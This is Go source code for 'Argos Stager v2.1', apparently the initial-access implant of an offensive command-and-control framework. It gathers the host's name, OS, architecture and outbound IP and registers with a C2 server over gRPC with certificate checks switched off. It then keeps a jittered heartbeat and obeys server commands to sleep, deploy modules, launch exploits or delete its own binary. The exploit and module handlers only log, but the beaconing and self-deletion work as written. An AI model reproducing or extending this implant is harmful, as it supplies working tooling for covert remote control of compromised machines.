// agents/stager/main.go
// Argos Stager v2.1 — Minimal gRPC agent for initial access.

package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"runtime"
	"time"

	pb "github.com/argos/shared/proto"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
)

const (
	defaultC2Host  = "127.0.0.1"
	defaultC2Port  = "50051"
	reconnectDelay = 30
)

type Stager struct {
	agentID    string
	hostname   string
	os         string
	arch       string
	outboundIP string
	c2Host     string
	c2Port     string
	useTLS     bool
	interval   int
	client     pb.AgentC2Client
	conn       *grpc.ClientConn
	cancel     context.CancelFunc
}

func main() {
	log.SetFlags(log.Ltime | log.Lshortfile)

	s := &Stager{
		c2Host: getEnv("ARGOS_C2_HOST", defaultC2Host),
		c2Port: getEnv("ARGOS_C2_PORT", defaultC2Port),
		useTLS: getEnv("ARGOS_TLS", "false") == "true",
	}
	s.collectInfo()
	s.run()
}

func (s *Stager) collectInfo() {
	s.hostname, _ = os.Hostname()
	s.os = runtime.GOOS
	s.arch = runtime.GOARCH
	s.outboundIP = getOutboundIP()
	s.agentID = fmt.Sprintf("stgr-%x", time.Now().UnixNano())[:16]
}

func (s *Stager) run() {
	backoff := 5 * time.Second
	maxBackoff := 5 * time.Minute
	for {
		ctx, cancel := context.WithCancel(context.Background())
		s.cancel = cancel
		if err := s.connect(ctx); err != nil {
			log.Printf("[Stager] %v. Retry in %v", err, backoff)
			cancel()
			time.Sleep(backoff)
			backoff = time.Duration(float64(backoff) * 1.6)
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
			continue
		}
		backoff = 5 * time.Second
		cancel()
	}
}

func (s *Stager) connect(ctx context.Context) error {
	addr := fmt.Sprintf("%s:%s", s.c2Host, s.c2Port)
	log.Printf("[Stager] Connecting to %s (TLS=%v)", addr, s.useTLS)

	var opts []grpc.DialOption
	if s.useTLS {
		opts = append(opts, grpc.WithTransportCredentials(credentials.NewTLS(&tls.Config{InsecureSkipVerify: true})))
	} else {
		opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	}
	opts = append(opts, grpc.WithBlock(), grpc.WithTimeout(10*time.Second))

	conn, err := grpc.DialContext(ctx, addr, opts...)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer conn.Close()
	s.conn = conn
	s.client = pb.NewAgentC2Client(conn)

	if err := s.register(ctx); err != nil {
		return fmt.Errorf("register: %w", err)
	}
	return s.beaconLoop(ctx)
}

func (s *Stager) register(ctx context.Context) error {
	resp, err := s.client.Register(ctx, &pb.AgentInfo{
		AgentId:  s.agentID,
		Hostname: s.hostname,
		Os:       s.os,
		Arch:     s.arch,
		Ip:       s.outboundIP,
		Version:  "2.1.0-stager",
	})
	if err != nil {
		return err
	}
	s.interval = int(resp.BeaconIntervalSec)
	log.Printf("[Stager] Registered. Mission: %s | Interval: %ds", resp.MissionId, s.interval)
	return nil
}

func (s *Stager) beaconLoop(ctx context.Context) error {
	stream, err := s.client.Beacon(ctx)
	if err != nil {
		return fmt.Errorf("beacon: %w", err)
	}

	// Heartbeat goroutine
	errCh := make(chan error, 1)
	go func() {
		jitter := func(base int) time.Duration {
			return time.Duration(float64(base)*(0.8+rand.Float64()*0.4)) * time.Second
		}
		for {
			select {
			case <-ctx.Done():
				return
			case <-time.After(jitter(s.interval)):
				event := &pb.AgentEvent{
					AgentId: s.agentID,
					Type:    pb.EventType_HEARTBEAT,
				}
				event.Event = &pb.AgentEvent_Hb{
					Hb: &pb.Heartbeat{CpuUsage: 0, MemUsage: 0},
				}
				if err := stream.Send(event); err != nil {
					errCh <- err
					return
				}
			}
		}
	}()

	// Command receive loop
	for {
		cmd, err := stream.Recv()
		if err != nil {
			return fmt.Errorf("recv: %w", err)
		}
		s.executeCommand(cmd)
	}
}

func (s *Stager) executeCommand(cmd *pb.DirectorCommand) {
	log.Printf("[Stager] Cmd: type=%d id=%s", cmd.Type, cmd.CommandId)

	switch cmd.Type {
	case pb.CommandType_SLEEP:
		s.interval = int(cmd.GetSleepCmd().DurationSec)
		log.Printf("[Stager] Sleep interval: %ds", s.interval)
	case pb.CommandType_SELF_DESTRUCT:
		log.Printf("[Stager] Self-destruct")
		os.Remove(os.Args[0])
		os.Exit(0)
	case pb.CommandType_DEPLOY_MODULE:
		log.Printf("[Stager] Deploy: %s", cmd.GetDeployCmd().ModuleName)
	case pb.CommandType_EXPLOIT:
		ec := cmd.GetExploitCmd()
		log.Printf("[Stager] Exploit: %s -> %s:%d", ec.Technique, ec.TargetHost, ec.TargetPort)
		// Stager is minimal — delegate to cell agent for real exploitation
	}
}

func getOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func getEnv(k, fallback string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return fallback
}
